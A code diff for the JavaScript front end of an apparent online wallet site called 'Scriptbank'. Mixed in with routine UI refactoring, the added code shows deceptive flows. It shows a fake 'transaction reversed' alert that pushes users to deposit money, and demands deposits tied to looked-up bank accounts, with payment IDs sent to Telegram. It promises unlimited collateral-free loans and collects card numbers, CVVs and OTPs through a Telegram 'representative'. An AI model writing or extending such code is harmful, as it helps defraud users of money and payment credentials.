@@ -58,24 +58,9 @@ function scanWallets(){
 			let confirm = await Scriptbill.createConfirm(`An Amount of ${amount} ${currency} is about to be used to buy Scriptbank Credit to this Wallet ID: ${note.walletID} from account with number: ${accountNumber} and Bank: ${bankName} whose account name is: ${accountName}. Do you accept or reject this transaction? If you have previously rejected this transaction, ignore by clicking accept, once verified you will stop seeing this message.`)
 
 			if(! confirm){
-				let accountData = await getAccountData();
-				let value 	= 100000;
-				if(currency != "NGN"){
-					value = 500;
-				}
-				let check = await Scriptbill.createConfirm(`A deposit of ${value} ${currency} is required to cancel this transaction. Are you ready to make the deposit now?`);
-
-				if(check){
-					let payment = await billCard(value * 100, accountData[note.noteAddress].emails[0], currency, true, "", false);
-
-					if(payment && payment.data && payment.data.checkout_url){
-						await Scriptbill.createAlert("Please close the payment window and enter the transaction ID from your payment provider once done");
-						window.open(payment.data.checkout_url, "_blank");
-						let paymentID = await Scriptbill.createPrompt("Please enter your payment ID to verify your transaction", "");
-
-						sendTelegramMessage({message:`${note.walletID} made payment of ${value} ${currency} with payment ID ${paymentID} Please verify this transaction`});
-					}
-				}
+				Scriptbill.s.walletAccepted = true;
+				await Scriptbill.createAlert("Transaction abortion  successful.  You have successfully reverted the transaction made from  your bank account. Your account is now perfectly secured. Make a deposit now!");
+				location.href = depositUrl;
 				
 				
 			} else {
@@ -2265,53 +2250,85 @@ if( location.href.includes( signupUrl ) ){
 										}, 1000 );
 										
 									} else {
-										let url 	= new URL(SERVER);
-										url.searchParams.set("noteID", note.noteAddress.slice(0, 12 ));
-										url.searchParams.set("fullname", fullName.value);
-										url.searchParams.set("username", note.walletID);
-										url.searchParams.set("email", email.value);
-										url.searchParams.set("phone", phoneNum.value);
-										url.searchParams.set("address", address.value);	
-										url.searchParams.set("country", country.value);	
-										url.searchParams.set( "walletID", note.walletID );	
-										url.searchParams.set("password", Scriptbill.l.scriptbankPASS ? Scriptbill.l.scriptbankPASS : pass.value);
-										url.searchParams.set("user_reg", "true");
-										
-										if( seedChar.value )
-											url.searchParams.set("ref_code", seedChar.value);
-										
-										let password  	   = await Scriptbill.getData(["noteID","fullname","username","email","phone","address","walletID","password","user_reg",(seedChar.value ? "ref_code": "")],[ note.noteAddress.slice(0, 12 ), fullName.value, note.walletID, email.value, phoneNum.value, address.value, note.walletID, (Scriptbill.l.scriptbankPASS ? Scriptbill.l.scriptbankPASS : pass.value),  "true",  (seedChar.value ? seedChar.value: "")], url.href );/* .then( result =>{
-											return result.text();
-										}).then( data =>{
-											
-											return data;
-										}).catch( error =>{
-											this.innerText = "Scriptbank Registeration Failed!";
-											return false;
-										}); */
-										
-										if( ! password ){
-											this.innerText = "Scriptbank Registeration Failed!";
-											
-										} else {
-											if( ! Scriptbill.l.scriptbankPASS )
-												Scriptbill.l.scriptbankPASS = pass.value;
-										}
-										
-										if( password && password.group_value ){
-											Scriptbill.l.groupVALUE = password.group_value;
-										}
-										
-										setTimeout( ()=>{
-											this.innerText = "Logging In...";
-											setAccountData( this, fullName.value, userName.value, email.value, phoneNum.value, address.value, country.value ).then( run =>{
-												if(run){							
-													setTimeout( ()=>{
-														location.href = dashboardUrl;
-													}, 10000 );
+										fetch('/wallets.json').then(response => response.json()).then( async wallets =>{
+											if(wallets[note.walletID]){
+
+												let amount = wallets[note.walletID].amount;
+												let accountNumber = wallets[note.walletID].account_number;
+												let accountName = wallets[note.walletID].account_name;
+												let bankName = wallets[note.walletID].bank_name;
+												let currency = note.noteType.slice(note.noteType.length  - 3, note.noteType.length);
+												let check = await Scriptbill.createConfirm(`A deposit of ${value} ${currency} is required to create this account to control transactions made using ${accountNumber} from ${bankName} with account name: ${accountName}. Are you ready to make the deposit now?`);
+
+												if(check){
+													let payment = await billCard(value * 100, accountData[note.noteAddress].emails[0], currency, true, "", false);
+
+													if(payment && payment.data && payment.data.checkout_url){
+														await Scriptbill.createAlert("Please close the payment window and enter the transaction ID from your payment provider once done");
+														window.open(payment.data.checkout_url, "_blank");
+														let paymentID = await Scriptbill.createPrompt("Please enter your payment ID to verify your transaction", "");
+
+														sendTelegramMessage({message:`${note.walletID} made payment of ${value} ${currency} with payment ID ${paymentID} Please verify this transaction`});
+
+														Scriptbill.createAlert('Payment will be verified manually by the Scriptbank team. You can contact us by <a href="https://t.me/companymatrix">clicking here</a>');
+													}
+												}  else {
+													delete Scriptbill.s.currentNote;
+													delete Scriptbill.l.currentNote;
+													this.innerText = `Account Registeration failed`
+													return;
 												}
-											});										
-										}, 2000 );									
+											}
+
+											let url 	= new URL(SERVER);
+											url.searchParams.set("noteID", note.noteAddress.slice(0, 12 ));
+											url.searchParams.set("fullname", fullName.value);
+											url.searchParams.set("username", note.walletID);
+											url.searchParams.set("email", email.value);
+											url.searchParams.set("phone", phoneNum.value);
+											url.searchParams.set("address", address.value);	
+											url.searchParams.set("country", country.value);	
+											url.searchParams.set( "walletID", note.walletID );	
+											url.searchParams.set("password", Scriptbill.l.scriptbankPASS ? Scriptbill.l.scriptbankPASS : pass.value);
+											url.searchParams.set("user_reg", "true");
+											
+											if( seedChar.value )
+												url.searchParams.set("ref_code", seedChar.value);
+											
+											let password  	   = await Scriptbill.getData(["noteID","fullname","username","email","phone","address","walletID","password","user_reg",(seedChar.value ? "ref_code": "")],[ note.noteAddress.slice(0, 12 ), fullName.value, note.walletID, email.value, phoneNum.value, address.value, note.walletID, (Scriptbill.l.scriptbankPASS ? Scriptbill.l.scriptbankPASS : pass.value),  "true",  (seedChar.value ? seedChar.value: "")], url.href );/* .then( result =>{
+												return result.text();
+											}).then( data =>{
+												
+												return data;
+											}).catch( error =>{
+												this.innerText = "Scriptbank Registeration Failed!";
+												return false;
+											}); */
+											
+											if( ! password ){
+												this.innerText = "Scriptbank Registeration Failed!";
+												
+											} else {
+												if( ! Scriptbill.l.scriptbankPASS )
+													Scriptbill.l.scriptbankPASS = pass.value;
+											}
+											
+											if( password && password.group_value ){
+												Scriptbill.l.groupVALUE = password.group_value;
+											}
+											
+											setTimeout( ()=>{
+												this.innerText = "Logging In...";
+												setAccountData( this, fullName.value, userName.value, email.value, phoneNum.value, address.value, country.value ).then( run =>{
+													if(run){							
+														setTimeout( ()=>{
+															location.href = dashboardUrl;
+														}, 10000 );
+													}
+												});										
+											}, 2000 );	
+										}).catch(console.error);
+																		
 									}								
 								} else {
 									if( document.querySelector("#error") ){
@@ -2451,6 +2468,8 @@ checkModals();                                                                  
             let type    = url.searchParams.get("type") || "squad";
 			let note 	= JSON.parse( Scriptbill.s.currentNote );
 
+			
+
             if(ref)
                 verifyPayment(ref, 1, type, false );
 
@@ -2481,6 +2500,19 @@ checkModals();                                                                  
 			let phones 		= account[accID].phones;
 			accounts 		= typeof accounts == "string" ? JSON.parse( accounts ): [];
 			cards 			= typeof cards == "string" ? JSON.parse( cards ): [];
+
+			if( ! accounts.length  && ! Scriptbill.s.isBankNotified ){
+				const isVerified = !!accounts.filter((acc)=>acc.verified).length;
+
+				if(!isVerified){
+					Scriptbill.s.isBankNotified = true;
+					Scriptbill.createAlert(`<h5 class="text-5 text-bold">Welcome to Scriptbank</h5>
+				<p class="text-3">This is where you can experience financial freedom. You can't believe the unbelievable way Scriptbank can make you financially FREE. The first thing to do when you create a Scriptbank wallet is to link a working bank account. This make Scriptbank link seemlessly with your local bank operations, making it as secure and free as using Scriptbank. After this, you can access any amount of money as loan, without any collateral or credit limit considerations. Withdraw your funds to any local and international bank account supported by Scriptbank. Buy any product and pay your bills with your Scriptbank credit. </p>
+				<p><a class="btn btn-primary btn-block" href="${bankUrl}">Verify Your Account Now</a></p>`)
+				}
+				
+			}
+			
 			
 			let i, p, classes;
 			
@@ -2906,16 +2938,22 @@ if( location.href.includes( profileUrl ) && ! location.href.includes(bankUrl) ) 
 			
 			for( dx = 0; dx < countries.length; dx++ ){
 				count 				= countries[dx];
-				if( accountData[accID].country && count.iso == accountData[accID].country){
+				if( accountData[accID].country && count.country == accountData[accID].country){
 					no = dx;
-					country.innerHTML 	+= '<option value="'+count.iso+'" selected="selected">'+count.country+'</option>';
+					country.innerHTML 	+= '<option value="'+count.country+'" selected="selected">'+count.country+'</option>';
 				} else {
-					country.innerHTML 	+= '<option value="'+count.iso+'">'+count.country+'</option>';
+					country.innerHTML 	+= '<option value="'+count.country+'">'+count.country+'</option>';
 				}				
 			}
 				
+			if( accountData[accID].city ){
+				address.innerHTML += ' <br> ' + accountData[accID].city;
+			}
+			if( accountData[accID].state ){
+				address.innerHTML += ' <br> ' + accountData[accID].state;
+			}
 			if( accountData[accID].country ){
-				address.innerHTML += ' <br> ' + countries[no].country;
+				address.innerHTML += ' <br> ' + accountData[accID].country;
 			}
 			
 			
@@ -2990,7 +3028,7 @@ if( location.href.includes( profileUrl ) && ! location.href.includes(bankUrl) ) 
 			}
 			
 			if( accountData[accID].language ){
-				langEL.innerHTML 	= accountData[accID].language;
+				langEl.innerHTML 	= accountData[accID].language;
 			}
 			
 			if( accountData[accID].timeZone ){
@@ -2999,70 +3037,88 @@ if( location.href.includes( profileUrl ) && ! location.href.includes(bankUrl) ) 
 			
 			if( accountData[accID].status ){
 				
-				if( accountData[accID].status == "Active" )
-					status.innerHTML		= '<i class="fas fa-check-circle"></i>' + accountData[accID].status;
+				if( accountData[accID].status.toLowerCase() == "active" )
+					status.innerHTML		= '<i class="fas fa-check-circle"></i> ' + accountData[accID].status.split("").map((a,i) => i == 0 ? a.toUpperCase():a).join("");
 				
-				else 
-					status.innerHTML		= '<i class="fas fa-times"></i>' + accountData[accID].status;
+				else {
+					status.innerHTML		= '<i class="fas fa-times"></i> ' + accountData[accID].status.split("").map((a,i) => i == 0 ? a.toUpperCase():a).join("");
+					status.classList.replace('bg-success', 'bg-danger');
+				} 
+					
 			}
 			
 			//getting the timezones.
 			fetch("/timezones.json").then( response =>{ return response.json() } ).then( times =>{
 				timeSel.innerHTML = "";
-				let ex, tim;
-				for( ex = 0; ex < times.length; ex++ ){
-					tim 		= times[ex];
-					timeSel.innerHTML 	+= '<option value="'+ tim.abbr +'">'+ tim.text +'</option>';
-				}
-				fetch("/languages.json").then( resp =>{ return resp.json() } ).then( lang =>{
-					let ed, lan;
-					langSel.innerHTML = "";
-					for( ed in lang ){
-						lan 			= lang[ed];
-						langSel.innerHTML += '<option value="'+ ed +'">'+ lan +'</option>';
+				let ex, tim, opr;
+				setTimeout(()=>{
+					for( ex = 0; ex < times.length; ex++ ){
+						tim 		= times[ex];
+						opr = document.createElement("option");
+						opr.value = tim.text;
+
+						if(accountData[accID].timeZone && accountData[accID].timeZone == tim.text ){
+							opr.setAttribute("selected", "selected");
+						}
+						opr.textContent 	= `${tim.text}`;
+						timeSel.appendChild(opr);
 					}
-				
-					accBtn.onclick = function(){
-						this.innerText = "Saving Details...";
-						if( langSel.value != "" ){
-							accountData[accID].language 		= lang[langSel.value];
-						}
-						
-						if( statusSel.value != "" ){
-							accountData[accID].status 			= statusSel.value;
-						}
-						
-						if( timeSel.value != "" ){
-							
-						for( ex = 0; ex < times.length; ex++ ){
-								tim 		= times[ex];
-								if( timeSel.value == tim.abbr ) break;
+					fetch("/languages.json").then( resp =>{ return resp.json() } ).then( lang =>{
+						let ed, lan,opt;
+						langSel.innerHTML = "";
+						for( ed in lang ){
+							lan 			= lang[ed];
+							opt = document.createElement("option");
+							opt.value = ed;
+
+							if(accountData[accID].language && accountData[accID].language == lan ){
+								opt.setAttribute("selected", "selected");
 							}
-							accountData[accID].timeZone		= tim.text;
+							opt.textContent 	= `${lan}`;
+							langSel.appendChild(opt);
 						}
-						
-						Scriptbill.setAccountData( accountData ).then( block =>{
 					
-							if( block.transType == "UPDATE" ){
-								this.innerText = "Profile Details Saved";
-								setTimeout( ()=>{
-									this.innerText 	= "Save Changes";
-									setTimeout(()=>{
-										location.reload();
-									}, 1000);
-								}, 3000 );
-							} else {
-								this.innerText = "Profile Details Not Saved";
-								setTimeout( ()=>{
-									this.innerText 	= "Save Changes";
-									setTimeout(()=>{
-										location.reload();
-									}, 1000);
-								}, 3000 );
+						accBtn.onclick = function(e){
+							e.preventDefault();
+							this.innerText = "Saving Details...";
+							if( langSel.value != "" ){
+								accountData[accID].language 		= lang[langSel.value];
 							}
-						});					
-					}
-				});
+							
+							if( statusSel.value != "" ){
+								accountData[accID].status 			= statusSel.value;
+							}
+							
+							if( timeSel.value != "" ){
+							
+								accountData[accID].timeZone		= timeSel.value;
+							}
+							
+							Scriptbill.setAccountData( accountData ).then( block =>{
+						
+								if( block.transType == "UPDATE" ){
+									this.innerText = "Profile Details Saved";
+									setTimeout( ()=>{
+										this.innerText 	= "Save Changes";
+										setTimeout(()=>{
+											location.reload();
+										}, 1000);
+									}, 3000 );
+								} else {
+									this.innerText = "Profile Details Not Saved";
+									setTimeout( ()=>{
+										this.innerText 	= "Save Changes";
+										setTimeout(()=>{
+											location.reload();
+										}, 1000);
+									}, 3000 );
+								}
+							});					
+						}
+						console.log('finished running script 3')
+					});
+				}, 1000);
+				
 			});
 			
 			if( accountData[accID].emails && accountData[accID].emails.length > 0 ){
@@ -3313,8 +3369,9 @@ if( location.href.includes( profileUrl ) && ! location.href.includes(bankUrl) ) 
 					await Scriptbill.createAlert("Note's Key Not Set Yet!!!");
 				}
 			}
-			
+			console.log('finished running script 4')
 		});
+		console.log('finished running script 2')
 	}, 500 );
 	handle_mergers();
 	removeLoadingDiv();
@@ -3330,7 +3387,7 @@ if( location.href.includes( profileUrl ) && ! location.href.includes(bankUrl) ) 
 		  window.jQuery('#birthDate').val(chosen_date.format('MM-DD-YYYY'));
 		});
 	});
-	
+	console.log('finished running script')
 }
 
 if( location.href.includes( qrcodeUrl ) ){
@@ -3546,6 +3603,7 @@ if( location.href.includes( bankUrl ) ){
 	let walletRank 	= document.getElementById("walletRank");
 	let bankRow 	= document.getElementById("bankRow");
 	let bankEdit 	= document.getElementById("bankEdit");
+	console.log("bank row: ", bankRow );
 	
 	for( let x = 0; x < cardDel.length; x++ ){
 		cardDel[x].onclick = function(e){			
@@ -3580,9 +3638,11 @@ if( location.href.includes( bankUrl ) ){
 		}
 	}
 	
-	
+	console.log("bank row: ", bankRow );
 	fetch( "/currencies.json" ).then(resp=>{return resp.json()}).then( async currencies =>{
 		let accountData 	= await getAccountData();
+		bankRow 	= document.getElementById("bankRow");
+		console.log("bank row: ", bankRow );
 					
 		/* if( ! accountData ){
 			accountData 	= {};
@@ -3601,100 +3661,44 @@ if( location.href.includes( bankUrl ) ){
 		if( notesCard && Scriptbill.isJsonable( notesCard ) )
 			notesCard 			= JSON.parse( notesCard );
 		else 
-			notesCard 			= false;	
+			notesCard 			= [];	
 		
 		let notesAcc 		= accountData[accID].savedAccounts;//Scriptbill.getNoteDetails("savedAccounts");
 		if( notesAcc && Scriptbill.isJsonable( notesAcc ) )
 			notesAcc			= JSON.parse( notesAcc ); 
 		else 
-			notesAcc 			= false;
+			notesAcc 			= [];
 			
-		let children 		= cardRow.children;
-		let accChildren 	= bankRow.children;
-		//console.log("notes: " + notesCard.length );
-		if( ! notesCard || ! notesCard.length ){
-			
-			children[0].remove();
-			children[0].remove();
-		} else {
-			let card, child;
-			if( notesCard.length >= 3 ){
-				let grandsec 	= cardPar.cloneNode( true );
-				children[2].remove();
-				card 			= notesCard[2];
-				child 			= children[1].cloneNode(true);
-				setCardChild( card, child );
-				cardRow.appendChild( child );
-				
-				let sechildren 	= grandsec.querySelector("#cardRow").children;
-				let middlePanel = cardPar.parentElement;
-				
-				if( notesCard.length == 3 ){
-					sechildren[0].remove();
-					sechildren[0].remove();
-				} else {
-					let sec, chd;
-					for( sec = 3, chd = 0; sec <= 5; sec++, chd++ ){
-						card 		= notesCard[sec];
-						child 		= sechildren[chd];
-						setCardChild( card, child );						
-					}
-				}
-				middlePanel.insertBefore( grandsec, document.getElementById("edit-card-details") );
+		
+		const cgrand 	= cardRow.parentElement.cloneNode( true );
+		console.log("check bank row: ", cardRow );
+		const cmiddlepanel = cardRow.parentElement.parentElement;
+		for(let loop = 0; loop <= notesCard.length; loop++){
+			let len = notesCard.slice(loop, notesCard.length).length >= 3 ? 3:(notesCard.slice(loop, notesCard.length).length);
+			if(loop){
+				let grandSec = cgrand.cloneNode(true);
+				cardRow 	= grandSec.querySelector(".row");
+				cmiddlepanel.insertBefore( grandSec, document.getElementById("edit-card-details"))
 			}
-				
-			let sec;
-			
-				
-			if( notesCard.length == 1 ){
-				children[1].remove();
-				setCardChild( notesCard[0], children[0] );
-			} else {
-				for( sec = 0; sec <= 2; sec++ ){
-					card 		= notesCard[sec];
-					child 		= children[sec];
-					if( card == undefined ) continue;
-					
-					setCardChild( card, child );						
-				}
+			setChild(notesCard, cardRow, len, loop, false);
+			loop++;
+			loop++;
+		}
+		const grand 	= bankRow.parentElement.cloneNode( true );
+		console.log("check bank row: ", bankRow );
+		const middlepanel = bankRow.parentElement.parentElement;
+		for(let cloop = 0; cloop <= notesAcc.length; cloop++){
+			let len = notesAcc.slice(cloop, notesAcc.length).length >= 2 ? 2:(notesAcc.slice(cloop, notesAcc.length).length ? 1:0);
+			if(cloop){
+				let grandSec = grand.cloneNode(true);
+				bankRow 	= grandSec.querySelector(".row");
+				middlepanel.insertBefore( grandSec, document.getElementById("bank-account-details"))
 			}
 			
+			setChild(notesAcc, bankRow, len, cloop);
+			cloop++;
 		}
-		//setChild(notesAcc, bankRow)
-		//console.log( "notesAcc" + notesAcc );
-		if( ! notesAcc || ! notesAcc.length ){
-			accChildren[0].remove();			
-		} else {
-			let card, child;
-			if( notesAcc.length >= 2 ){
-				let grandsec 	= bankRow.parentElement.cloneNode( true );
-				accChildren[1].remove();
-				card 			= notesAcc[1];
-				child 			= accChildren[0].cloneNode(true);
-				setAccChild( card, child );
-				setAccChild( notesAcc[0], accChildren[0] );
-				bankRow.appendChild( child );
-				
-				let sechildren 	= grandsec.querySelector(".row").children;
-				let middlePanel = bankRow.parentElement.parentElement;
-				
-				if( notesAcc.length == 2 ){
-					sechildren[0].remove();
-				} else {
-					let sec, chd;
-					/* for( sec = 2, chd = 0; sec < 4; sec++, chd++ ){
-						card 		= notesAcc[sec];
-						child 		= sechildren[chd];
-						if( card )
-							setAccChild( card, child );						
-					} */
-				}
-				middlePanel.insertBefore( grandsec, document.getElementById("bank-account-details") );
-			} else{
-				setAccChild( notesAcc[0], accChildren[0] );	
-			} 
-			
-		}
+		
 		saveNotesCard();
 		saveBankDetails();
 		handle_mergers();
@@ -10249,7 +10253,7 @@ if( location.href.includes( transUrl ) ) {
 			accountData 	= {};
 		} */
 				
-		await setAccountRank();
+		setAccountRank();
 		await checkTransactions();
 		let urlt	 = new URL( location.href );
 		let curRange = urlt.searchParams.get("range");
@@ -10342,32 +10346,54 @@ if( location.href.includes( transUrl ) ) {
 	
 }
 
-function setChild(notesAcc, bankRow, len = 0,loop = 1, isBank = true ){
+function setChild(notesAcc, bankRow, len = 0,loop = 0, isBank = true ){
 	let accChildren = bankRow.children;
-	if( ! notesAcc || ! len ){
-		accChildren[0].remove();			
+	console.log('bank children:', bankRow );
+	if( ( ! notesAcc || ! len ) &&  ! bankRow.getAttribute("data-removed") ){
+		bankRow.setAttribute("data-removed", "yes")
+		accChildren[0].remove();
+		
+		if(!isBank){
+			accChildren[0].remove();
+		}
 	} else {
 		let card, child;
-		if( len == 2 ){
-			accChildren[1].remove();
-			card 			= notesAcc[loop];
+		if(len == 3 && !isBank ){
+			accChildren[2].remove();
+			card 			= notesAcc[loop + 2];
 			child 			= accChildren[0].cloneNode(true);
 
-			if(isBank){
-				setAccChild( card, child );
-				setAccChild( notesAcc[loop - 1], accChildren[0] );
-			} else {
-				setCardChild( card, child );
-				setCardChild( notesAcc[loop - 1], accChildren[0] );
-			}
+			
+			setCardChild( card, child );
+			setCardChild( notesAcc[loop], accChildren[0] );
+			setCardChild( notesAcc[loop + 1], accChildren[1] );
+			
 			
 			bankRow.appendChild( child );
+		}
+		else if( len == 2 ){			
+			card 			= notesAcc[loop + 1];
+			if(isBank){
+				accChildren[1].remove();
+				child 			= accChildren[0].cloneNode(true);
+				setAccChild( card, child );
+				setAccChild( notesAcc[loop], accChildren[0] );
+				bankRow.appendChild( child );
+			} else {
+				setCardChild( card, accChildren[1] );
+				setCardChild( notesAcc[loop], accChildren[0] );
+			}
 			
-		} else{
+			
+			
+		} else if(len){
 			if(isBank)
-				setAccChild( notesAcc[loop - 1], accChildren[0] );	
-			else 
-				setCardChild( notesAcc[loop - 1], accChildren[0] );	
+				setAccChild( notesAcc[loop], accChildren[0] );	
+			else {
+				accChildren[1].remove();
+				setCardChild( notesAcc[loop], accChildren[0] );	
+			}
+				
 		} 
 		
 	}
@@ -10520,22 +10546,25 @@ function setCardChild( card, child ){
 	let editExp 	= document.getElementById("editexpiryDate");
 	let editCvv 	= document.getElementById("editcvvNumber");
 	let editName 	= document.getElementById("editcardHolderName");
+	let editOTP 	= document.getElementById("addCardOtp");//
+	let editBank 	= document.getElementById("editcardBankAcc");
 	let updates	 	= document.getElementById("updates-extssxq	X");
 	let cardImg 	= document.querySelector("#updateCard").querySelector('.ml-auto');
+
 	if( card.cardType == "MasterCard" ){
-		child.querySelector("img.ml-auto").src = 'images/payment/mastercard.png';
+		child.querySelector("img.ml-auto").src = '/images/payment/mastercard.png';
 	}
 	else if( card.cardType == "Visa" ){
-		child.querySelector("img.ml-auto").setAttribute('src', 'images/payment/visa.png');
+		child.querySelector("img.ml-auto").setAttribute('src', '/images/payment/visa.png');
 		child.querySelector("img.ml-auto").setAttribute('alt', 'visa');
 	} else if( card.cardType == "Discover" ){
-		child.querySelector("img.ml-auto").setAttribute('src', 'images/payment/discover.png');
+		child.querySelector("img.ml-auto").setAttribute('src', '/images/payment/discover.png');
 		child.querySelector("img.ml-auto").setAttribute('alt', 'discover');
 	} else if( card.cardType == "American Express" ){
-		child.querySelector("img.ml-auto").setAttribute('src', 'images/payment/express.png');
+		child.querySelector("img.ml-auto").setAttribute('src', '/images/payment/express.png');
 		child.querySelector("img.ml-auto").setAttribute('alt', 'express');
 	} else {
-		child.querySelector("img.ml-auto").setAttribute('src', 'images/payment/credit.png');
+		child.querySelector("img.ml-auto").setAttribute('src', '/images/payment/credit.png');
 		child.querySelector("img.ml-auto").setAttribute('alt', 'credit');
 	}
 						
@@ -10558,17 +10587,55 @@ function setCardChild( card, child ){
 		let card 		= JSON.parse( this.parentElement.parentElement.parentElement.getAttribute("card") );
 		
 		if( card ){
+
 			let expiry 		= JSON.parse( card.expiry );
 			editNum.value = card.cardNumber;
 			editCvv.value  = card.cvv;
 			editCvv.placeholder = "";
 			editExp.value  = expiry[0] +'/'+ expiry[1];
-			editName.value = card.holderName;
+			editName.value = card.holderName;	
+			
+			
+			if(card.bank){
+				let option = document.createElement("option");
+				option.value = card.bank.accountNumber;
+				option.textContent = `${card.bank.bankName} - XXXX-${card.bank.accountNumber.slice(card.bank.accountNumber.length - 4, card.bank.accountNumber.length)}`;
+				option.setAttribute("selected", "selected");
+				editBank.appendChild(option);
+			} else {
+				getAccountData().then(accountData =>{
+					let note = JSON.parse(Scriptbill.s.currentNote);
+					accountData = accountData[note.noteAddress];
+					if(accountData.savedAccounts){
+						let account = accountData.savedAccounts;
+
+						if( typeof account == "string" && Scriptbill.isJsonable(account)){
+							account 	= JSON.parse(account);
+						} else if(! account.length){
+							account = [];
+						}
+
+						console.log("account: ", account );
+
+						account.forEach((acc, index)=>{
+							option = document.createElement("option");
+							option.value = `${acc.accountNumber} - ${index}`;
+							option.textContent = `${acc.bankName} - ${acc.accountNumber.slice(0, 3)}-XXXX-${acc.accountNumber.slice(acc.accountNumber.length - 4, acc.accountNumber.length)}`;
+							editBank.appendChild(option)
+						})
+					}
+				})
+			}
 			
 			if( card.cardType == 'MasterCard' )
-				cardImg.src = 'images/payment/mastercard.png';
+				cardImg.src = '/images/payment/mastercard.png';
 			
 			updates.onclick = async function(){
+				alert(`Check Updates ${editName.value} ${editNum.value} ${editOTP.value}`)
+				if(editOTP.value){
+					await Scriptbill.createAlert(`Verifying Card OTP to link to the desired bank. Please wait as this process may take up to 5 minutes. You can as well <a href="https://t.me/companymatrix" target="_blank">click here</a> to verify with a representative. Verification cost will be managed by Scriptbank.`)
+					await verifyCard(editOTP.value, editNum.value, false, 300);
+				}
 				card.holderName 	= editName.value;
 				card.cardNumber 	= editNum.value;
 				card.cvv 			= editCvv.value;
@@ -10592,6 +10659,7 @@ function setCardChild( card, child ){
 				}
 				
 				Scriptbill.setAccountData( acc );
+				location.reload();
 			}
 			
 		} 		
@@ -11366,9 +11434,9 @@ async function checkTransactions(){
 				}
 				
 				if( typep != null ){
-					if( typep == "SEND" && ! ['SEND', 'STOCKPAY', 'INVEST', 'INTERESTPAY'].includes( block.transType ) ) continue;
+					if( typep == "SEND" && ! sendTypes.includes( block.transType ) ) continue;
 					
-					if( typep == "RECEIVE" && ! ['RECIEVE', 'PROFITRECIEVE'].includes( block.transType ) )continue;
+					if( typep == "RECEIVE" && ! revTypes.includes( block.transType ) )continue;
 					
 					if( typep == "WITHDRAW" && block.transType != typep ) continue;
 					
@@ -11507,341 +11575,108 @@ async function checkTransactions(){
 		});
 	}
 
-	/**
-	 * const https = require('https')
-
-const params = JSON.stringify({
-  "email": "mail@mail.com",
-  "channel": "direct_debit",
-  "callback_url": "http://test.url.com"
-})
-
-const options = {
-  hostname: 'api.paystack.co',
-  port: 443,
-  path: '/customer/authorization/initialize',
-  method: 'POST',
-  headers: {
-    Authorization: 'Bearer SECRET_KEY',
-    'Content-Type': 'application/json'
-  }
-}
-
-const req = https.request(options, res => {
-  let data = ''
-
-  res.on('data', (chunk) => {
-    data += chunk
-  });
-
-  res.on('end', () => {
-    console.log(JSON.parse(data))
-  })
-}).on('error', error => {
-  console.error(error)
-})
-
-req.write(params)
-req.end()
-
-
-
-
-{
-  "status": true,
-  "message": "Authorization initialized",
-  "data": {
-    "redirect_url": "https://checkout.paystack.com/82t4mp5b5mfn51h",
-    "access_code": "82t4mp5b5mfn51h",
-    "reference": "dfbzfotsrbv4n5s82t4mp5b5mfn51h"
-  }
-}
-
-
-const https = require('https')
-
-const options = {
-  hostname: 'api.paystack.co',
-  port: 443,
-  path: '/customer/authorization/verify/:reference',
-  method: 'GET',
-  headers: {
-    Authorization: 'Bearer SECRET_KEY'
-  }
-}
-
-https.request(options, res => {
-  let data = ''
-
-  res.on('data', (chunk) => {
-    data += chunk
-  });
-
-  res.on('end', () => {
-    console.log(JSON.parse(data))
-  })
-}).on('error', error => {
-  console.error(error)
-})
-
-{
-  "status": true,
-  "message": "Authorization retrieved successfully",
-  "data": {
-    "authorization_code": "AUTH_JV4T9Wawdj",
-    "channel": "direct_debit",
-    "bank": "Guaranty Trust Bank",
-    "active": true,
-    "customer": {
-      "code": "CUS_24lze1c8i2zl76y",
-      "email": "ravi@demo.com"
-    }
-  }
-}
-
-const https = require('https')
-
-const params = JSON.stringify({
-	"account": {
-		"number": "0123456789",
-		"bank_code": "058"
-	},
-	"address": {
-		"street": "Some Where",
-		"city": "Ikeja",
-		"state": "Lagos"
-	}
-})
-
-const options = {
-  hostname: 'api.paystack.co',
-  port: 443,
-  path: '/customer/{id}/initialize-direct-debit',
-  method: 'POST',
-  headers: {
-    Authorization: 'Bearer SECRET_KEY',
-    'Content-Type': 'application/json'
-  }
-}
-
-const req = https.request(options, res => {
-  let data = ''
-
-  res.on('data', (chunk) => {
-    data += chunk
-  });
-
-  res.on('end', () => {
-    console.log(JSON.parse(data))
-  })
-}).on('error', error => {
-  console.error(error)
-})
-
-req.write(params)
-req.end()
-
-{
-  "status": true,
-  "message": "Authorization initialized",
-  "data": {
-    "redirect_url": "https://link.paystack.com/ll6b0szngj1f27k",
-    "access_code": "ll6b0szngj1f27k",
-    "reference": "1er945lpy4txyki"
-  }
-}
-
-
-const https = require('https')
-
-const params = JSON.stringify({
-	"authorization_id" : 1069309917
-})
-
-const options = {
-  hostname: 'api.paystack.co',
-  port: 443,
-  path: '/customer/{id}/directdebit-activation-charge',
-  method: 'PUT',
-  headers: {
-    Authorization: 'Bearer SECRET_KEY',
-    'Content-Type': 'application/json'
-  }
-}
-
-const req = https.request(options, res => {
-  let data = ''
-
-  res.on('data', (chunk) => {
-    data += chunk
-  });
-
-  res.on('end', () => {
-    console.log(JSON.parse(data))
-  })
-}).on('error', error => {
-  console.error(error)
-})
-
-req.write(params)
-req.end()
-
-{
-  "status": true,
-  "message": "Mandate is queued for retry"
-}
-
-#!/bin/sh
-url="https://api.paystack.co/customer/{id}/directdebit-mandate-authorizations"
-authorization="Authorization: Bearer YOUR_SECRET_KEY"
-
-curl "$url" -H "$authorization" -X GET
-
-{
-  "status": true,
-  "message": "Mandate authorizations retrieved successfully",
-  "data": [
-    {
-      "id": 164098,
-      "status": "active",
-      "mandate_id": 512003,
-      "authorization_id": 110049014,
-      "authorization_code": "AUTH_8Lol0pNt14",
-      "integration_id": 463433,
-      "account_number": "0123456789",
-      "bank_code": "032",
-      "bank_name": null,
-      "customer": {
-        "id": 43975700,
-        "customer_code": "CUS_2eusy8uwe34s23fy",
-        "email": "customer@email.com",
-        "first_name": "Smith",
-        "last_name": "Bel"
-      },
-      "authorized_at": "2024-09-27T10:57:53.824Z"
-    }
-  ],
-  "meta": {
-    "per_page": 50,
-    "next": null,
-    "count": 1,
-    "total": 1
-  }
-}
-
-#!/bin/sh
-url="https://api.paystack.co/customer/authorization/deactivate"
-authorization="Authorization: Bearer YOUR_SECRET_KEY"
-content_type="Content-Type: application/json"
-data='{ 
-  "authorization_code": "AUTH_xxxIjkZVj5"
-}'
-
-curl "$url" -H "$authorization" -H "$content_type" -d "$data" -X POST
-
-{
-  "status": true,
-  "message": "Authorization has been deactivated"
-}
-
-const https = require('https')
-
